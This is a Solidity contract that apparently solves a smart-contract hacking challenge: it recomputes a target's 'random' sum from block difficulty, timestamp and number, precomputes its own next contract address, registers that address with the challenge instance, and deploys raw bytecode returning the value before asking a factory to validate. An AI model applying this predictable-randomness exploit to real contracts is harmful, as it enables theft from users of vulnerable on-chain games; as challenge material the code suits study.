// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract find_rand {
    event logging(uint256 val);
    event logging2(bytes vall);
    event log_addr(address addr);
    address public factory;
    address public creator;

    constructor() {
        factory = 0x17cD1C05d20fCce7e4d68B1ED1dA2406dD6c5B16;
        creator = 0xd190e0fEE2ea635934E5CA74100B19F56349Abc1;
    }

    function findRandSum() public returns (uint32) {
        uint32 ret = 0;
        uint256[] memory v0 = new uint256[](100);
        uint256 v1 = 0;
        while (v1 < 100) {
            v0[v1] = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, block.number, v1))) % 1000;
            emit logging(v0[v1]);
            v1 += 1;
        }
        for(uint256 i = 0; i < 100; i++)
            ret += uint32(v0[i]);
        emit logging(ret);
        return ret;
    }   

    function make_contract() public returns (address){
        address CA;
        bytes memory init = hex"60805f52600880600d5f395ff3";
        bytes memory runtime1 = hex"61";
        uint16 value = uint16(findRandSum());
        bytes memory runtime2 = hex"5f52595ff3";
        emit logging(value);
        bytes memory creationcode = abi.encodePacked(init, runtime1, value, runtime2);
        emit logging2(creationcode);
        assembly {
            CA := create(0, add(creationcode, 32), mload(creationcode))
            let sz := extcodesize(CA)
            if iszero(sz) {
                revert(0, 0)
            }
        }
        emit log_addr(CA);
        return CA;
    }
    function getAddress(uint256 nonce) public view returns (address) {
        return address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            address(this),
            uint8(nonce) 
        )))));
    }

    function phase1() public {
        (bool suc1, ) = factory.call(abi.encodeWithSelector(0xb27754c8, address(creator)));
        require(suc1, "instance create failed"); 
    }
    
    function phase2(address instance) public {
        address nextAddr = getAddress(1);
        (bool suc2, ) = instance.call(abi.encodeWithSignature("setSumOfArrayContract(address)", address(nextAddr)));
        require(suc2, "call failed");
    }

    function phase3(address instance) public {
        address my_addr = make_contract();
        assembly {
            let a := extcodesize(my_addr)
        }
        (bool suc, ) = factory.call(abi.encodeWithSelector(0x58bd3c9c, address(instance)));
        require(suc, "failed");
    }
}